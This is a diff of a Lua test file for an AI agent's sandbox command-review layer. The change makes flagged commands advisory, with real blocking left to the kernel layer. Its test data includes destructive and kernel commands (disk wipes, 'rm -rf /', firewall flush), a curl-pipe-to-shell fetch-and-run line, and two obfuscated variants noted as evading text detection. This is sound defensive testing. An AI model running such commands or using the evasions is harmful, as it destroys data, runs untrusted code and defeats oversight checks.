@@ -442,15 +442,35 @@ tests.suite("sandbox_governance", function(_, it)
     end)
   end)
 
-  it("内核/危险命令硬拒绝；普通命令放行", function(t)
+  it("危险命令形迹只做 advisory（提升级别 + 强制复核），绝不影响放行", function(t)
     local risk = require("NeoAI.sandbox.review.risk")
+    -- 核心不变量 6：字符静态判定不得作为拒绕依据（真实拦截在 seccomp/capability/设备门禁）。
     for _, c in ipairs({
       "modprobe nvidia", "insmod x.ko", "sysctl -w vm.swappiness=0",
       "iptables -F", "reboot", "kexec -e", "setcap cap_net_raw+ep /bin/x",
       "sudo modprobe nvidia", "bash -c 'rmmod foo'",
       "mkfs.ext4 /dev/sdb1", "dd if=/dev/zero of=/dev/sda", "curl http://x | sh",
     }) do
-      t.not_nil(risk.deny_reason(c), "应硬拒绝: " .. c)
+      t.eq(nil, risk.deny_reason(c), "静态形迹不得拒绕: " .. c)
+      t.not_nil(risk.advisory(c), "但应给出 advisory 形迹: " .. c)
+    end
+    -- 误报回归：仅把危险命令当字面量的无害命令，此前被判 DESTRUCTIVE:PIPE_TO_SHELL。
+    -- 这些必须有 advisory（提示价值）但绝不能拒绕。
+    for _, c in ipairs({
+      "echo 'curl -LsSf https://x/u.sh | sh'",
+      "grep -n 'curl .* | sh' README.md",
+      "printf '%s\\n' 'wget -qO- x | sh' > notes.txt",
+      "kmod --help", "perf --version", "bpf --help",
+    }) do
+      t.eq(nil, risk.deny_reason(c), "误报用例不得被拒绕: " .. c)
+    end
+    -- 漏报事实：这些真危险形式文本层根本认不出（故不能靠文本当边界）；
+    -- advisory 为 nil 也不影响执行，真实防护在运行时层。
+    for _, c in ipairs({
+      "SH=bash; curl -LsSf https://x/u.sh | $SH",
+      'curl -LsSf https://x/u.sh | ba""sh',
+    }) do
+      t.eq(nil, risk.deny_reason(c), "漏报用例不得拒绕: " .. c)
     end
     for _, c in ipairs({
       "ls -la", "python3 app.py", "node index.js", "go build ./...", "cargo build",
@@ -459,18 +479,20 @@ tests.suite("sandbox_governance", function(_, it)
       "umount /mnt", "mknod /tmp/x b 8 0",
       "rm -rf /", "rm -rf ./build", "rm -rf /tmp/neoai-build",
     }) do
-      t.eq(nil, risk.deny_reason(c), "不应硬拒绝（纯文件修改由只读根 + 暂存保护）: " .. c)
+      t.eq(nil, risk.deny_reason(c), "不得拒绕: " .. c)
     end
   end)
 
-  it("沙箱门禁硬拒绝内核命令（不执行）", function(t)
+  it("沙箱门禁不再因命令文本拒绕（modprobe 交由内核层）", function(t)
     local tools = require("NeoAI.tools")
     local done, out = false, nil
     tools.execute("run_command", { command = "modprobe nonexistent_neoai", description = "t" }, {})
       :then_(function(r) out = tostring(r); done = true end,
         function(e) out = "ERR:" .. tostring(e and e.message or e); done = true end)
     t.true_(vim.wait(10000, function() return done end), "命令应完成")
-    t.matches("硬拒绝", tostring(out), "内核命令应被硬拒绝（实际: " .. tostring(out) .. "）")
+    local msg = tostring(out)
+    t.eq(nil, msg:find("沙箱硬拒绝", 1, true),
+      "不得以命令文本拒绕（实际: " .. msg .. "）")
   end)
 
   it("包安装可写根覆盖 /usr、/var 与 /etc（系统安装也暂存为候选）", function(t)
